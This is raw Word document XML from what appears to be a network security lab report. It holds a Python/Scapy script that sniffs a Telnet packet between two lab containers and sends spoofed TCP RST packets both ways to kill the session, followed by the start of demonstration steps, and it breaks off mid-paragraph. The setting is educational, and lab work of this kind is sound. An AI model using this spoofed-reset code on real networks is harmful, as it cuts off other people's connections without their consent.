    <w:p w14:paraId="53EE1DE1" w14:textId="77777777" w:rsidR="0075765F" w:rsidRPr="00C2328F" w:rsidRDefault="0075765F" w:rsidP="0075765F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>VICTIM_B = "10.9.0.6"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70FD1674" w14:textId="77777777" w:rsidR="0075765F" w:rsidRPr="00C2328F" w:rsidRDefault="0075765F" w:rsidP="0075765F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3853588D" w14:textId="77777777" w:rsidR="0075765F" w:rsidRPr="00C2328F" w:rsidRDefault="0075765F" w:rsidP="0075765F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>print("</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>🔍</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Sniffing Telnet traffic to get ports and sequence...")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7078EF2A" w14:textId="77777777" w:rsidR="0075765F" w:rsidRPr="00C2328F" w:rsidRDefault="0075765F" w:rsidP="0075765F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6A7C0535" w14:textId="77777777" w:rsidR="0075765F" w:rsidRPr="00C2328F" w:rsidRDefault="0075765F" w:rsidP="0075765F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t># Sniff one Telnet packet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32E0B246" w14:textId="77777777" w:rsidR="0075765F" w:rsidRPr="00C2328F" w:rsidRDefault="0075765F" w:rsidP="0075765F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>pkt = sniff(filter=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>f"tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> host {VICTIM_A} and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>dst</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> host {VICTIM_B} and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>dst</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> port 23", </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>iface</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>=IFACE, count=1)[0]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7123F01C" w14:textId="77777777" w:rsidR="0075765F" w:rsidRPr="00C2328F" w:rsidRDefault="0075765F" w:rsidP="0075765F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0ABF435C" w14:textId="77777777" w:rsidR="0075765F" w:rsidRPr="00C2328F" w:rsidRDefault="0075765F" w:rsidP="0075765F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t># Extract tuple and seq</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6687C429" w14:textId="77777777" w:rsidR="0075765F" w:rsidRPr="00C2328F" w:rsidRDefault="0075765F" w:rsidP="0075765F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>sport = pkt[TCP].sport</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="017D4B64" w14:textId="77777777" w:rsidR="0075765F" w:rsidRPr="00C2328F" w:rsidRDefault="0075765F" w:rsidP="0075765F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>dport</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> = pkt[TCP].</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>dport</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="3EC1DD6C" w14:textId="77777777" w:rsidR="0075765F" w:rsidRPr="00C2328F" w:rsidRDefault="0075765F" w:rsidP="0075765F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>seq = pkt[TCP].seq</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E584484" w14:textId="77777777" w:rsidR="0075765F" w:rsidRPr="00C2328F" w:rsidRDefault="0075765F" w:rsidP="0075765F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0B493773" w14:textId="77777777" w:rsidR="0075765F" w:rsidRPr="00C2328F" w:rsidRDefault="0075765F" w:rsidP="0075765F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>print(f"</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>✅</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Got packet: {VICTIM_A}:{sport} &gt; {VICTIM_B}:{</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>dport</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>} Seq={seq}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12E0F2CC" w14:textId="77777777" w:rsidR="0075765F" w:rsidRPr="00C2328F" w:rsidRDefault="0075765F" w:rsidP="0075765F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5ACF428A" w14:textId="77777777" w:rsidR="0075765F" w:rsidRPr="00C2328F" w:rsidRDefault="0075765F" w:rsidP="0075765F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t># RST from A to B</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C389E71" w14:textId="77777777" w:rsidR="0075765F" w:rsidRPr="00C2328F" w:rsidRDefault="0075765F" w:rsidP="0075765F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ip1 = IP(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">=VICTIM_A, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>dst</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>=VICTIM_B)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03234DFD" w14:textId="77777777" w:rsidR="0075765F" w:rsidRPr="00C2328F" w:rsidRDefault="0075765F" w:rsidP="0075765F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">tcp1 = TCP(sport=sport, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>dport</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>dport</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, flags="R", seq=seq)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C739CD4" w14:textId="77777777" w:rsidR="0075765F" w:rsidRPr="00C2328F" w:rsidRDefault="0075765F" w:rsidP="0075765F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">send(ip1/tcp1, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>iface</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>=IFACE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A545A84" w14:textId="77777777" w:rsidR="0075765F" w:rsidRPr="00C2328F" w:rsidRDefault="0075765F" w:rsidP="0075765F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="11216148" w14:textId="77777777" w:rsidR="0075765F" w:rsidRPr="00C2328F" w:rsidRDefault="0075765F" w:rsidP="0075765F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t># RST from B to A</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="489DCD37" w14:textId="77777777" w:rsidR="0075765F" w:rsidRPr="00C2328F" w:rsidRDefault="0075765F" w:rsidP="0075765F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ip2 = IP(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">=VICTIM_B, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>dst</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>=VICTIM_A)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68D68A73" w14:textId="77777777" w:rsidR="0075765F" w:rsidRPr="00C2328F" w:rsidRDefault="0075765F" w:rsidP="0075765F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>tcp2 = TCP(sport=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>dport</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>dport</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>=sport, flags="R", seq=pkt[TCP].ack)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58F8F11F" w14:textId="098A44F5" w:rsidR="00B40568" w:rsidRPr="00C2328F" w:rsidRDefault="0075765F" w:rsidP="0075765F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">send(ip2/tcp2, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>iface</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>=IFACE)</w:t>
      </w:r>
      <w:r w:rsidR="00B40568" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>To demonstrate the script terminating the Telnet session between A and B first open the session:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61EDB5DC" w14:textId="77777777" w:rsidR="00B40568" w:rsidRPr="00C2328F" w:rsidRDefault="00B40568" w:rsidP="00B40568">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>docker exec -it victim-10.9.0.5 bash</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01792A77" w14:textId="7766AC9C" w:rsidR="00B40568" w:rsidRPr="00C2328F" w:rsidRDefault="00B40568" w:rsidP="00B40568">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>telnet 10.9.0.6</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B4BCC80" w14:textId="369B3CE3" w:rsidR="004006EE" w:rsidRPr="00C2328F" w:rsidRDefault="00B40568" w:rsidP="004006EE">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
